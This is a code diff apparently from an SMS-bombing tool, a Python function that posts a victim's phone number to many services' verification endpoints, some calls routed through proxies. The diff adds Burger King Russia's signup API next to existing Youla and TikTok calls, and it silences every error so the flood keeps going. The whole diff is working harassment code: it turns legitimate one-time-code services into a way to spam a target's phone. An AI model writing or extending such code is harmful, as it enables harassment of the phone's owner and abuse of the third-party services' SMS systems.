@@ -292,6 +292,12 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					payload = {"phone":number,"invite":""}
+					requests.post("https://burgerking.ru/api-web-front/api/v3/auth/signup", json=payload, proxies=proxies)
+				except:
+					pass
+
+				try:
 					payload = {"phone": number}
 					requests.post("https://youla.ru/web-api/auth/request_code", headers=header, data=payload, proxies=proxies)
 				except:
@@ -567,6 +573,12 @@ def sms(prx, number, tm, code):
 
 				try:
 					requests.post("https://m.tiktok.com/node-a/send/download_link", json={"slideVerify": 0, "language": "ru", "PhoneRegionCode": code, "Mobile": number[1:], "page": {"pageName": "home", "launchMode": "direct", "trafficType": ""}}, headers=header)
+				except:
+					pass
+
+				try:
+					payload = {"phone":number,"invite":""}
+					requests.post("https://burgerking.ru/api-web-front/api/v3/auth/signup", json=payload)
 				except:
 					pass
 
